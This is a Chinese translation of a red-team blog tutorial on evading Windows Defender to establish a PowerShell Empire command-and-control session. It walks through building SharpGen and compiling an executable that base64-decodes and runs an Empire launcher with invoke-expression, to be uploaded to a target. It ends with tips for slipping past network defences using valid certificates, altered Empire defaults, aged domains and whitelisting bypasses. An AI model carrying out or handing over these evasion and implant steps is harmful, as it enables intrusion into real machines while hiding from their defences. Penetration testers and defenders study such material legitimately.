> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/4159)

本文翻译自 [Getting PowerShell Empire Past Windows Defender](https://www.blackhillsinfosec.com/getting-powershell-empire-past-windows-defender/)

### 0x01 前言

Windows 自带的杀毒软件 Defender 在阻止很多攻击手法方面都做得很好，包括使用 PowerShell Empire 等工具建立 C2 通信。我最近在研究一种在启用了 Defender 的 Win10 电脑上建立 C2 会话的方法。我发现有一个叫 [SharpSploit](https://github.com/cobbr/SharpSploit) 的项目成功绕过了 Defender。SharpSploit 将其他安全研究人员的研究成功融合到了一个工具中，并其是利用`c#`代码而不是`PowerShell.exe`来实现。这种技术有助于绕过 AV 对恶意 PowerShell 活动的常见检测。

目前我最感兴趣的是利用`sharsploit`命令调用`PowerShellExecute`中的方法。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190220172740-c511665c-34f1-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190220172740-c511665c-34f1-1.png)

值得一提的是它还融合了 [Matt Graeber](https://twitter.com/mattifestation) 的 AMSI 绕过技术和 [Lee Christensen](https://twitter.com/tifkin_) 的 PowerShell 日志绕过技术。综合利用起来很方便! 同时也得提一下 绕过 Defender 的核心工作是绕过 AMSI。

### 0x02 过程

废话不多说，开始学习如何利用`PowerShell Empire`绕过 Defender 等杀毒的手法。

下面将使用 [shargen](https://cobbr.io/SharpGen.html) 将我们想要的`sharsploit`功能打包到可执行文件中。打包所需要用到的[.Net Core SDK](https://dotnet.microsoft.com/download) 文件可以点击蓝字下载到。

`Defender`并不会对`SharpGen`的代码文件报毒 但是为了避免不必要的麻烦 你可以选择添加一个白名单文件夹来进行相关处理 通过 [Git For Windows](https://gitforwindows.org/) 执行下面的代码获取`SharpGen`的代码：

```
git clone https://github.com/cobbr/SharpGen.git
```

`SharpGen`和`PowerKatz`是捆绑在一起的，`PowerKatz`会被编译成最终的可执行文件，此时`Defender`仍然会阻止这些可执行文件。因为我们的目标不是运行`Mimikatz`(通过 PowerKatz)，所以我们修改代码来禁用它。在`SharpGen`文件夹中的`Resources.yml`文件如下:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190220172802-d212ab9a-34f1-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190220172802-d212ab9a-34f1-1.png)

确保资源文件中的每个`Enabled`字段都修改为`false`后。准备打包`SharpGen DLL`。

```
cd SharpGen
dotnet build -c Release
```

程序将生成一个`bin/Release/netcoreapp2.1`目录，里面就包含下一步所需的`SharpGen.dll`文件。作为测试，我们先构建一个使用`Write-Output`将`hi`打印到屏幕上的可执行文件。

```
dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe -d net40 "Console.WriteLine(Shell.PowerShellExecute(\"Write-Output hi\"));"
```

执行完后将在`Output`文件夹中找到编译好的可执行文件。上述命令中的`-d net40`参数的意思是选择`.Net 4.0`的编译环境，如果您的目标系统上是`.Net 3.5`那么就需要修改为对应的`-d net35`，这是个容易掉进去的坑 望周知。

完了运行`example.exe`即可将`hi`打印到屏幕上。如果直接点击运行会一闪而过 看不到运行结果。所以建议通过`cmd.exe`来运行，以便查看输出。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190220172817-daca7d3a-34f1-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190220172817-daca7d3a-34f1-1.png)

为了实现最终目标，下面将构建一个可执行文件来运行`PowerShell`的一行代码，以便与`Empire`建立 C2 连接。利用用`PowerShell Empire`中的`multi/launcher stager`生成一行代码 ([参考](https://www.blackhillsinfosec.com/using-powershell-empire-with-a-trusted-certificate/))。我们只需要将生成的`base64`字符串复制到下面命令中即可。

```
dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f Launcher.exe -d net40 "Console.WriteLine(Shell.PowerShellExecute(\"$c = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64_LAUNCHER>')); invoke-expression -command $c\"));"
```

(替换命令中的`<BASE64_LAUNCHER>`即可)

随后将`Output`中的`Launcher.exe`上传到目标中在运行即可绕过 Defender 的保护。

### 0x03 总结

然而再实战中`Defender`可能并不是企业环境中会遇到的唯一防御。例如，可能会有网络防御来检查网络流量并阻断通信。这里提供一些绕过的小技巧。

1.  使用`https`协议进行通讯 并且要使用有效的的 SSL 证书（非自己生成的）。
    
2.  修改所有配置的默认值，如启动`Empire Listener`时`DefaultJitter`和`DefaultProfile`的值。
    
3.  使用一个老域名 (不是最近购买的) 和分类的域名。（原文表达的意思为类白名单机制 AV 会重点检查新域名 如果是政府域名这类的域名直接放行）
    
4.  如果白名单起到作用，但是 AV 阻止生成的随机可执行文件，可运用一些白名单绕过技术后再尝试。如我之前绕过的[例子](https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/).